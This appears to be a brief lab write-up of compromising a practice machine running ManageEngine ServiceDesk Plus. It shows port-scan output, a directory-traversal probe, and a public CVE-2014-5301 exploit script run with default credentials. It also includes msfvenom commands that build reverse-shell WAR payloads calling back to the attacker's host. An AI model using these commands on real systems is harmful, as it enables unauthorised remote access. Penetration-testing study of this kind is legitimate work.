### rustscan as always
`docker run -it --rm --name rustscan rustscan/rustscan:1.10.0 $IP`

Open 192.168.200.43:3389
Open 192.168.200.43:8080
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 3389,8080 192.168.200.43

### Nmap
```bash
❯ sudo nmap -sV -sS -sC -A $IP -p3389,8080

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-title: ManageEngine ServiceDesk Plus
|_http-server-header: Apache-Coyote/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   288.15 ms 192.168.49.1
2   289.15 ms 192.168.200.43
```

### Let's start on 8080 since nothing else literally
`searchsploit ManageEngine ServiceDesk Plus`

http://192.168.200.43:8080/images/boot.ini

### Google RCE directly as it's a 10 points machine
exploit ManageEngine ServiceDesk 7.6

https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py

`wget https://raw.githubusercontent.com/PeterSufliarsky/exploits/master/CVE-2014-5301.py`

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.200 LPORT=8080 -f war -o reverse.war <- wrong since war belong to JAVA

msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.200 LPORT=4444 -f war > shell.war

sudo python3 CVE-2014-5301.py 192.168.200.43 8080 administrator administrator shell.war
```